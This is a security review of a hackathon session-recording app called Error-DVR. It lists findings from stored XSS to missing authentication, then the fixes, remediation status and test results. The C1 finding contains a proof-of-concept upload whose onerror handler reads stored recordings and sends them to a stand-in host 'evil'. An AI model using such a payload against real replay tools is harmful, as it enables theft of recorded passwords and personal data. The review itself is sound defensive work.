# Security Review — Error‑DVR

**Scope:** `C:\Users\Lenovo\.gemini\antigravity-ide\scratch\web opbolte` (the `error-dvr` hackathon app)
**Reviewer role:** security owner for this application
**Date:** 2026‑10‑23
**Verdict (original code):** **do not run it, and do not record any real user session with it.** Two critical issues, four high, several medium. The code has since been rewritten — see [Remediation status](#remediation-status).

---

## 1. What the app is, and why it matters

Error‑DVR records a rolling window of everything a user does in a web app — DOM mutations, keystrokes into form fields, network requests, console output — and stores it locally in SQLite so a developer can replay the moment before a crash.

That design means **the database is a transcript of user sessions**, including anything typed into a password, card, or search field, plus URLs that may carry session tokens. Everything below is judged against that: a bug here is not "a demo bug", it is a credential and PII disclosure.

---

## 2. Findings

Severity uses CVSS‑style judgement for this deployment (single‑user local tool, but holding third‑party user data).

| # | Severity | Finding | Location |
|---|----------|---------|----------|
| C1 | **Critical** | Stored XSS in the replay UI → complete takeover of the DVR origin, exfiltration of every recording | `public/replay.js`, `public/replay.html`, `src/server.js` |
| C2 | **Critical** | No authentication or authorisation on either endpoint; any slice readable by anyone | `src/server.js` |
| H1 | **High** | Privacy masking is a no‑op: passwords and PII recorded in plaintext | `src/sdk.js` |
| H2 | **High** | No input validation, no storage bound, no rate limit → DoS and disk exhaustion | `src/server.js`, `src/db.js` |
| H3 | **High** | Server binds `0.0.0.0`, exposing recordings to the whole LAN | `src/server.js:53` |
| H4 | **High** | Remote CDN scripts with no SRI and no CSP → supply‑chain code execution in the replay origin | `public/replay.html:15‑16` |
| M1 | Medium | Client‑chosen, non‑cryptographic slice IDs | `src/sdk.js:172`, `src/server.js:22` |
| M2 | Medium | 7 vulnerable dependencies incl. 1 critical, and `sqlite3` cannot load at all on Node 22 | `package.json` |
| M3 | Medium | SDK never loads (CJS/ESM mismatch + wrong static path) — the "masking" users believe is on was never running | `src/sdk.js:5`, `public/index.html:15` |
| M4 | Medium | No `Host` validation → DNS‑rebinding attacks against `127.0.0.1` | `src/server.js` |
| M5 | Medium | Missing all security response headers | `src/server.js` |
| L1 | Low | `JSON.parse` of stored payload unguarded → 500 and event‑loop stall | `src/db.js:47` |
| L2 | Low | `X-Powered-By: Express` disclosure | `src/server.js` |
| L3 | Low | No integrity hashing — stored evidence can be altered undetectably | `src/db.js` |
| L4 | Low | Secrets/recordings on disk with default permissions | `src/db.js:18` |
| L5 | Low | Client buffer can grow unbounded on non‑monotonic timestamps | `src/sdk.js:161‑166` |
| L6 | Low | Replay crashes on malformed `duration` (`toFixed` on a non‑number) | `public/replay.js:35` |

---

## 3. Critical and High findings in detail

### C1 — Stored XSS in the replay UI (Critical)

**How it works.** `/upload` accepts an arbitrary JSON `slice` and stores it verbatim. `/replay/:id` then feeds that array straight into `rrwebPlayer`, which rebuilds the recorded DOM **in the DVR's own origin**. rrweb reconstructs elements and applies their attributes, so a crafted event stream can carry `onerror`, `onclick`, `srcdoc`, or `javascript:` URLs and execute script when a developer opens the replay.

```jsonc
// attacker POSTs to http://127.0.0.1:3000/upload — no credentials needed
{"sessionId":"x","slice":[{"type":2,"timestamp":1,"data":{"node":{
  "type":0,"id":1,"childNodes":[{"type":2,"tagName":"img","id":2,
  "attributes":{"src":"x","onerror":"fetch('/api/slice/…').then(r=>r.text()).then(t=>fetch('https://evil/?'+btoa(t)))"}
}]}}}]}
```

**Impact.** Script runs same‑origin with the API, so it can enumerate and exfiltrate *every stored recording* — all the passwords, tokens and PII in the DVR — and read `localStorage`. One malicious upload plus one developer clicking "replay" compromises the entire archive.

**Root cause.** Untrusted input is rendered by a powerful DOM reconstruction engine in a privileged origin, with no sanitisation and no isolation.

**Fix.**
1. Server‑side sanitisation of the event stream before storage (`src/security.js: scrub()`): strips `on*` attributes, `srcdoc`, `javascript:`/`vbscript:`/`data:text/html` URLs, and drops `script`, `iframe`, `object`, `embed`, `base` nodes entirely.
2. The player runs in an `<iframe sandbox="allow-scripts allow-same-origin">` served from the **other loopback hostname**. If the dashboard is on `127.0.0.1`, the player loads from `localhost` — a genuinely different origin. Recorded payloads therefore cannot read the dashboard DOM, its `sessionStorage` (where the admin token lives), or its cookies, and the player's CSP sets `connect-src 'none'` so it cannot exfiltrate.

   *Why not an opaque origin?* An earlier revision used `sandbox="allow-scripts"` with no `allow-same-origin`, which makes the frame's origin opaque. That is stronger isolation, but rrweb 2.1 renders the replay inside its **own** nested iframe, and an opaque-origin parent cannot reach it — so the replay canvas stayed permanently blank. Testing caught it; the origin boundary gives equivalent protection without breaking the renderer.
3. Replay UI renders text with `textContent` only, never `innerHTML` (it already did — kept).

### C2 — No authentication on read or write (Critical)

```
POST /upload          → open
GET  /api/slice/:id   → open
```

Two consequences:

- **Confidentiality:** anyone who can reach the port — any local process, any other user on the machine, any host on the LAN — reads any recording by ID. A visited website can also reach `127.0.0.1:3000` (see M4 for the rebinding path).
- **Integrity:** with no auth there is no audit trail of who stored what, and no trust boundary between the instrumented page and the archive.

**Fix.** Two *separate* credentials, because they protect different things:

| Credential | Held by | Grants |
|---|---|---|
| `ingestKey` | the instrumented page (public by nature) | create slices only |
| `adminToken` | the operator | read slices |

The instrumented page — the part most likely to be compromised — can therefore never read other users' recordings. Both are 256‑bit CSPRNG values, compared in constant time (`timingSafeEqual` over SHA‑256 digests), persisted at `data/.secrets.json` with mode `0600`.

### H1 — Privacy masking does nothing (High)

`src/sdk.js:26` masks only when `event.type === 2`, with the comment "Mutation event". In rrweb, **2 is `FullSnapshot`**; mutations are `IncrementalSnapshot` (`3`) with `data.source === 0`. So the branch never fires on mutations — and `FullSnapshot` has no `data.attributes`, only `data.node`. Net effect: **no masking is ever applied to any event**.

Worse, the initial `FullSnapshot` contains the entire document as it stood when recording started, including input values. `maskText` would not have saved you anyway: it replaces only `[A-Za-z0-9]`, leaving `@`, `.`, `-`, `_` and all non‑ASCII text intact, so emails and names survive in a readable, reversible shape.

**Fix.** Use rrweb's own masking primitives, which operate on the raw DOM before serialisation:
`maskAllInputs: true`, `maskInputOptions` for password/email/tel/text/number/search, `maskInputFn` normalising lengths, `maskTextSelector` for `[data-dvr-sensitive]` and card/OTP autocompletes, `blockSelector` for `[data-dvr-block]`.
Plus a second layer on the way out: `redactText()`/`redactUrl()` strip emails, 13–19‑digit card shapes, 32+ char tokens, URL userinfo, and secret‑named query parameters (`token`, `key`, `session`, `code`, `sig`, …); `redactPath()` removes `C:\Users\<name>`.

### H2 — Unbounded, unvalidated ingestion (High)

No schema check, no `slice.length` cap, no per‑ID rate limit, no retention policy. A loop of 5 MB POSTs fills the disk; one oversized event array blocks the event loop in `JSON.stringify`/`JSON.parse`; `sessionId` was never type‑checked, so a non‑string could reach the SQLite binder.

**Fix.** Strict validation (`type` ∈ {0..5} or `network`/`console`/`error`, numeric finite `timestamp`, legal incremental `source`, depth ≤ 64, string ≤ 100 kB), caps of 1 MB body and 5000 events, a fixed‑window per‑IP rate limit (30 uploads/min, 120 reads/min), and a retention policy that keeps at most 2000 slices.

### H3 — Listens on all interfaces (High)

`app.listen(PORT)` binds `0.0.0.0`. A "local‑only" recorder holding passwords was reachable from the LAN.

**Fix.** `app.listen(PORT, config.host)` with `host: "127.0.0.1"`.

### H4 — Unsigned CDN scripts, no CSP (High)

`replay.html` pulled `rrweb` and `rrweb-player` from `cdn.jsdelivr.net` with no `integrity`, no `crossorigin`, and no CSP. Whoever controls that CDN path (or can MITM it) executes arbitrary JS in the replay origin — the same outcome as C1, without needing an upload.

**Fix.** The bundles are vendored into `vendor/` and served from our own origin with pinned content; `script-src` no longer needs a third‑party origin. The replay page now has `default-src 'none'` with explicit allowances.

---

## 4. Why the app didn't run at all

Worth recording, because "it looked fine in the IDE" hid a broken supply chain:

```
Error: Could not locate the bindings file
  ... node_modules\sqlite3\build\Release\node_sqlite3.node
```

`sqlite3@5.1.7` ships no prebuilt binary for Node 22 (ABI 127) and the `node-gyp` fallback was never run. **The server could not start**, so every security control in the original description ("masks all sensitive data by default") was unverifiable *and* inactive.

`npm audit` on that tree: **7 vulnerabilities — 1 critical, 4 high, 2 low**, all in the `node-gyp → cacache → tar` chain pulled in by `sqlite3` (`GHSA-34x7-hfp2-rc4v`, `GHSA-8qq5-rm4j-mr97`, and others). `axios` was declared but never imported.

**Fix.** `node:sqlite` (built into Node ≥ 22.5) replaces `sqlite3`, removing `node-gyp`, `cacache`, `tar` and `bindings` from the tree. Result: **one runtime dependency (`express`), zero known vulnerabilities.** No native build step.

---

## 5. What the rewritten app does differently

```
Request
  → Host allow-list            (421 on foreign Host — DNS rebinding)
  → security headers           (CSP, nosniff, DENY, no-referrer, Permissions-Policy)
  → rate limit                 (per-IP fixed window)
  → credential gate            (ingest key for write, admin token for read)
  → size-capped JSON parse     (1 MB)
  → schema validation          (event types, timestamps, depth, string length)
  → sanitisation               (strip XSS vectors)
  → SHA-256 hash + insert      (server-generated UUID, append-only, retention)
```

Architectural changes worth calling out:

- **Server-generated IDs.** The client no longer picks the key. `crypto.randomUUID()` gives 122 bits of entropy and removes the enumeration surface entirely.
- **Token in the URL fragment.** `/replay/<id>#token=…` — fragments are never sent to the server, so the token stays out of request lines, proxy logs and `Referer`. The page strips it from the address bar via `history.replaceState` and sends it as a header. It is never placed in `localStorage` or a cookie.
- **Isolated replay.** The player is a sandboxed iframe served from the other loopback hostname, with its own explicit-origin CSP, `connect-src 'none'`, `img-src` restricted (so a recorded `<img>` cannot beacon to a third party during replay), and `form-action 'none'`. The replay host can never read the dashboard's `sessionStorage`, where the admin token lives.
- **Token handling.** The dashboard asks for the admin token once and keeps it in `sessionStorage` for that tab only — never `localStorage`, never a cookie, never a URL. Share links carry no token; a recipient unlocks their own tab. The replay page accepts a `#token=` fragment for one-off links and strips it from the address bar immediately.
- **Write-only CORS.** The SDK is meant to be pasted into *someone else's* site, so its upload is cross-origin and `/upload` answers preflights for any origin. That is deliberately asymmetric: `/upload` is the only endpoint with CORS headers, it still requires the ingest key, and it can only *create* traces. No read endpoint ever emits `Access-Control-Allow-Origin`, so a hostile page can write junk (rate-limited) but cannot read a single recording. A test asserts both halves of that boundary.
- **Loopback enforced.** `--host` refuses anything that is not `127.0.0.1`, `localhost` or `::1`. The replay isolation depends on having a second loopback origin; silently allowing a LAN bind would quietly remove it.
- **Evidence integrity.** Each slice is stored with a SHA‑256 of its payload and re‑verified on read; the reply carries `integrity: "ok" | "mismatch"` and the UI warns loudly on mismatch.
- **Recorder hardening.** Hard cap of 5000 events, single‑flight uploads with a 10 s cooldown, self‑recording suppressed (the SDK's own upload isn't captured), and same‑origin enforcement on the upload URL.

---

## 6. Remediation status

| # | Status | Where |
|---|--------|-------|
| C1 | Fixed — sanitiser + opaque-origin sandbox + CSP | `src/security.js`, `public/replay.js`, `public/player.js` |
| C2 | Fixed — split ingest/read credentials | `src/security.js`, `src/server.js` |
| H1 | Fixed — rrweb native masking + redaction layers | `public/sdk.js` |
| H2 | Fixed — validation, caps, rate limit, retention | `src/security.js`, `src/server.js`, `src/db.js` |
| H3 | Fixed — binds `127.0.0.1` | `src/config.json`, `src/server.js` |
| H4 | Fixed — vendored, no CDN, strict CSP | `vendor/`, `src/server.js` |
| M1 | Fixed — server-side `randomUUID` | `src/server.js` |
| M2 | Fixed — `node:sqlite`, `axios` dropped | `package.json`, `src/db.js` |
| M3 | Fixed — classic script, same-origin paths | `public/sdk.js`, `src/server.js` |
| M4 | Fixed — Host allow-list | `src/security.js` |
| M5 | Fixed — full header set | `src/security.js` |
| L1 | Fixed — guarded parse, `corrupt` integrity state | `src/db.js` |
| L2 | Fixed — `x-powered-by` disabled | `src/server.js` |
| L3 | Fixed — SHA‑256 per slice, verified on read | `src/db.js` |
| L4 | Fixed — `data/` dir `0700`, secrets `0600` | `src/db.js`, `src/security.js` |
| L5 | Fixed — hard event cap + safe prune | `public/sdk.js` |
| L6 | Fixed — `Number.isFinite` guards in renderers | `public/replay.js` |

---

## 7. Verification performed

### `npm test` — 85 black-box checks, all passing

- header set on every response type; CSP contents, including the player's explicit-origin policy
- foreign `Host` rejected with 421; allow-listed accepted
- upload without key / with wrong key / with the admin token → 401
- read without token / with the ingest key → 401; with admin token → 200
- `GET /api/slices` (dashboard listing): 401 without a token, 401 with the ingest key, metadata only, capped by `limit`, never returns payloads
- malformed JSON, wrong types, empty slice, >5000 events, >1 MB body → 400/413
- injected `script`, `iframe`, `onerror`, `onclick`, `srcdoc`, `javascript:` — verified **absent from what the database returns**, while benign attributes survive
- invalid/unknown slice IDs → 400/404
- 8 path-traversal and source-disclosure attempts → all blocked
- upload flood → 429
- every local `src`/`href` on all three pages resolves with 200
- every asset loaded by the opaque-origin frame carries `Cross-Origin-Resource-Policy: cross-origin`

### `npm run test:e2e` — 38 headless-Chrome checks, all passing

Drives the real pages over the DevTools protocol, attaching to the cross-origin player as a separate out-of-process target:

- the player is an OOPIF running on a **different loopback origin** from the dashboard
- the parent cannot read `iframe.contentDocument`; the frame cannot read `window.parent.document`, and holds no admin token in its own storage
- **the recorded DOM really is rebuilt** — the test reads the replayed text out of rrweb's nested frame (this is the check that exposed the blank-canvas bug)
- the error pin lands on the timeline, the error summary and plain-English bullets render, the severity chip reads Critical
- admin token is stripped from the address bar
- an injected `onerror` payload does **not** execute
- zero CSP violations, zero uncaught exceptions
- **dashboard path:** unlocks with the token, renders trace cards, KPIs, the 24-hour chart, and opens the detail drawer
- **recorder path:** the demo page reports "Recorder armed", clicking the crash button produces a `POST /upload` accepted with 200, and a result card renders

### 7.1 Defects found by testing that static review had missed

Worth recording, because each would have shipped silently:

1. **Inline scripts vs. my own CSP.** The first demo page used inline `<script>` blocks, which `script-src 'self'` blocks. Moved to `/config.js` and `/demo.js`.
2. **`Cross-Origin-Resource-Policy: same-origin` blocked the player script.** A cross-origin frame fetches `/player.js` as a no-cors request, so the global CORP header silently stopped it loading — the player mounted but did nothing. `/player.js` and the vendor assets now send `cross-origin`.
3. **rrweb's UMD bundles expose a namespace object, not a constructor.** `window.rrwebPlayer` is `{ default: … }`, so `typeof === 'function'` was false and the player bailed out. Both the SDK and the player now resolve the real export.
4. **rrweb 2.1 builds a nested sandbox before its wrapper is in the document,** throwing `createSandboxedIframe() requires root to be connected`. Resolved by mounting `rrweb.Replayer` directly with `UNSAFE_replayCanvas`, which is safe here because the player document is already isolated by origin.
5. **An opaque-origin player cannot render.** With `sandbox="allow-scripts"` (no `allow-same-origin`) the frame's origin is opaque, and rrweb's *nested* replay frame then gets a fresh opaque origin that rrweb cannot reach — the canvas stayed blank while every other check passed. Fixed by isolating the player with a separate loopback origin instead of opacity, and the E2E test now asserts replayed text.
6. **The replay canvas overflowed the stage.** rrweb renders at the recorded viewport size (1440px), so the content was clipped. The player now scales and centres the canvas to fit, and re-fits on resize.
7. **`keepalive: true` silently dropped real traces.** Chrome caps the total in-flight keepalive body at 64 KB. Once the redesigned stylesheet was inlined into the snapshot, every upload exceeded it and the request died after being sent — no response, no error, nothing. The recorder now uses a plain `fetch`; it uploads while the page is alive, so keepalive bought nothing.
8. **`Cross-Origin-Resource-Policy` blocked the SDK on every third-party page.** `/sdk.js` inherited the global `same-origin` CORP header, so when the snippet was pasted into any other origin the browser refused to load the script — the recorder never ran and nothing was captured. Only the tool's own demo page worked, which is why it looked fine. `/sdk.js` now sends `corp: cross-origin`, and the security suite asserts cross-origin embeddability for every asset a foreign page loads.

### `npm run test:cli` — 31 checks, all passing

Exercises the shipped binary the way a user would: `--version`, `--help`, unknown-command handling, server startup and banner, dashboard/demo/SDK routes, the `token`/`snippet`/`rotate` commands (including that the snippet never contains the admin token), and the CORS boundary — preflight allowed, cross-origin upload accepted with the key, rejected without it, and **no CORS headers on any read endpoint, even when authorised**.

### `npm run test:detect` — 13 checks, all passing

The honesty test: it serves fixture pages from a **separate origin** (exactly how the snippet is used on a real site) and checks what actually gets captured.

- a real `TypeError` from ordinary page code, with no demo button — captured, severity critical, stack pointing at the fixture file
- an unhandled promise rejection — captured with its message
- a **healthy** page — no trace created at all (no false positives)
- the resulting slice contains DOM events and a full snapshot, i.e. it is replayable, even though the fixture loads only `sdk.js` (the SDK fetches rrweb itself)
- the browser's network log confirms preflight `204` then `200`

### Residual risk

1. **Isolation now rests on the origin boundary, not on opacity.** `127.0.0.1` and `localhost` are distinct origins, so the player cannot read the dashboard's DOM or `sessionStorage`. This does assume both hostnames resolve to this machine; if you ever front the app with a proxy that maps them to one host, the separation disappears — switch to a dedicated second port or domain at that point.
2. **Sanitisation is allowlist-by-structure, not a formal proof.** It stops the known rrweb XSS vectors (`on*`, `srcdoc`, `javascript:`, active tags). A future rrweb feature that reconstructs DOM in a novel way could evade it — which is why the origin-isolated sandbox exists as the real boundary. Keep both.
3. **The ingest key is public by design.** Anyone who can load the instrumented page can create slices (rate-limited, write-only). An attacker can pollute the archive with junk slices, bounded by the 2000-slice cap and the rate limit. They cannot read anything.
4. **No TLS.** Plaintext HTTP on loopback. Fine for loopback, not acceptable if `host` is ever changed to a real interface.
5. **Single-process rate limiting.** In-memory buckets reset on restart and don't coordinate across instances.
6. **`frame-src` is not `'none'`.** It must allow the player origin, and the player must allow `about:` because rrweb creates a nested frame for rendering. Both stay inside loopback.
7. **rrweb remains a large attack surface.** If you upgrade the vendored bundle, re-run both test suites and review rrweb's advisories.
8. **Retention, not encryption.** The SQLite file is plaintext. On a shared machine, use BitLocker/EFS; `data/` is `.gitignore`d and mode-restricted.
9. **The dashboard is a single page with in-page views** — no per-view URLs, so deep links go to the dashboard, not to `#/recordings`. Deliberate for now; adding routes means adding matching auth checks.

---

## 8. Operating notes

- `data/.secrets.json` holds both credentials. Delete it to rotate; a new pair is generated on next start. Never commit it.
- The admin token is printed to the console at startup (convenience for a local demo). Suppress it if the console is captured — set `DVR_QUIET=1` and read the file instead, or delete the `console.log` on line ~330 of `src/server.js`.
- To change the bind address, edit `host` in `src/config.json` **and** add the origin to `allowedHosts` and `ORIGINS`, otherwise the Host check and the player CSP will reject you — that is intentional.
- Masking is on by default. `privacyMasking: false` is for local debugging only; treat any recording made with it as sensitive plaintext.
